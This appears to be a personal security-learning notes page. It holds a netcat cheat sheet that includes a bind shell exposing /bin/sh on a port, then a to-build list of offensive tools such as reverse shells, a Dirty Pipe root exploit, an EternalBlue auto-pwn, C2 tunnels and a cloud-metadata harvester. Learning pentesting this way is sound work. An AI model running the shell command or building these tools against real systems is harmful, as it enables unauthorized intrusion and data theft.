<pre>
nc google.com 80

GET / HTTP/1.0    # then press Enter twice

nc -l 1337                    # listen
nc -l 1337 -e "/bin/sh"        # classic bind shell

# From another machine:
nc your-ip 1337

# Simple port scan
nc 10.1.1.1 1-1000
</pre>

### TODO

Here’s a curated list of small, useful security tools that are realistic and fun to build yourself (most can be <500 lines of C/Python/Rust/Go). They’re the kind of tools you actually use in real pentests, CTFs, or red team ops when full Metasploit/Empire/Cobalt Strike isn’t an option.

### Network & Recon Tools
| Tool Name              | Language | Size    | What it does                                                                 |
|-------------------------|----------|---------|-------------------------------------------------------------------------------|
| Tiny port scanner       | C        | ~150 lines | Multi-threaded TCP SYN or connect() scanner                                 |
| Masscan clone           | C        | ~400 lines | Raw packet ultra-fast port scanner (like real masscan)                      |
| HTTP verb / method fuzzer | Go     | ~100 lines | Checks ALLOWED methods, finds OPTIONS/PUT/DELETE etc.                       |
| SMB null session checker| Python   | ~80 lines  | Checks for anonymous SMB login + share enumeration                          |
| DNS brute-forcer        | Go/Rust  | ~200 lines | Subdomain brute with wildcard detection                                     |
| mDNS/LLMNR prober       | Python   | ~120 lines | Detects name resolution poisoning opportunities on local nets               |

### Web Application Tools
| Tool Name                   | Language | Size     | Purpose                                                                 |
|-----------------------------|----------|----------|-------------------------------------------------------------------------|
| LFI/RFI scanner             | Python   | ~200 lines | Automated LFI payload testing + filter bypasses                         |
| SSRF tester                 | Go       | ~150 lines | Tests internal IPs, cloud metadata endpoints, gopher:// etc.            |
| Open redirect fuzzer        | Bash/Python | ~70 lines | Finds unvalidated redirects → stolen OAuth tokens                       |
| Fast directory brute-forcer | Rust/Go  | ~250 lines | 200k req/s dirbuster (parallel + wordlist streaming)                    |
| JWT cracker / none-alg tool | Python   | ~100 lines | Brute-forces weak secrets + none algorithm exploit                      |

### Post-Exploitation / Privilege Escalation
| Tool Name                  | Language | Size     | Use case                                                      |
|----------------------------|----------|----------|---------------------------------------------------------------|
| Linux enum script          | Bash     | ~300 lines | Classic linpeas-lite (kernel exploits, SUID, cron, etc.)      |
| Windows enum binary        | C        | ~400 lines | Tiny WinPEAS alternative (no .NET dependency)                 |
| SUID/SGID finder + exploiter | C      | ~200 lines | Finds common SUID binaries and suggests known exploits        |
| Dirty pipe (CVE-2022-0847) exploit | C   | ~80 lines  | Working local root for vulnerable kernels                     |

### Reverse Engineering / Binary Tools
| Tool Name              | Language | Size     | Purpose                                              |
|------------------------|----------|----------|------------------------------------------------------|
| Strings 2.0            | C        | ~100 lines | Faster strings with entropy filter                   |
| Tiny unpacker (UPX)    | C        | ~300 lines | Strips UPX packing on ELF/Mach-O/PE                  |
| ELF header parser      | Python   | ~120 lines | Detects packing, PIE, NX, RELRO, etc.                |

### Tunneling & Pivoting
| Tool Name                | Language | Size     | Notes                                                   |
|--------------------------|----------|----------|---------------------------------------------------------|
| Tiny SOCKS4/5 proxy      | C        | ~350 lines | Single-binary SOCKS server for pivoting             |
| ICMP/UDP/DNS tunnel (client+server) | Go | ~400 lines | Exfil/C2 over weird protocols                           |
| Chisel clone             | Go       | ~600 lines | Fast TCP/UDP tunneling (very close to real chisel)      |
| SSH dynamic pivot (-D) replacement | C  | ~250 lines | Tiny SSH -D equivalent without full SSH                 |

### Password Cracking / Hash Tools
| Tool Name                  | Language | Size     | Speed                                            |
|----------------------------|----------|----------|--------------------------------------------------|
| Fast NTLM hash cracker     | C+OpenCL | ~300 lines | Uses GPU for netntlmv1/v2                        |
| John-the-Ripper “Tiny”     | C        | ~500 lines | Only supports MD5crypt, bcrypt, NTLM             |
| PKZIP cracker              | Rust     | ~150 lines | Recovers weak zip passwords quickly                           |

### One-Liners That Become Tools
These start as 5-line scripts and evolve into real tools people use daily:
- `grep -r "password\|secret\|key" .` → full source-code secret scanner
- One-line reverse shell in 10 languages (bash, perl, python, powershell, etc.)
- Auto-pwn script for EternalBlue (MS17-010)
- Cloud metadata harvester (169.254.169.254 tester for every provider)
